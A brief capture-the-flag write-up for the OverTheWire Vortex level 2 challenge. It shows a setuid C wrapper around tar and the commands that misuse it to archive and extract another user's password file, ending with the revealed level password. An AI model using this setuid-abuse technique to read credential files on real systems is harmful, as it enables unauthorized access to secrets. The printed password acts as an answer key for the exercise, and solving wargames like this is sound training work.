vortex2.c:

#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
}

so we'll try to create a tar file with the level password...

Usage: tar [OPTION...] [FILE]...
GNU 'tar' saves many files together into a single tape or disk archive, and can
restore individual files from the archive.

Examples:
  tar -cf archive.tar foo bar  # Create archive.tar from files foo and bar.
  tar -tvf archive.tar         # List all files in archive.tar verbosely.
  tar -xf archive.tar          # Extract all files from archive.tar.

ls -la:
-r-sr-x---  1 vortex3  vortex2   7303 Nov  4 05:25 vortex2    

so we pass the password: /vortex/vortex2 /etc/vortex_pass/vortex3  
then we extract: tar -xvf  /tmp/ownership.\$\$.tar etc/vortex_pass/vortex3  

we get: 64ncXTvx#



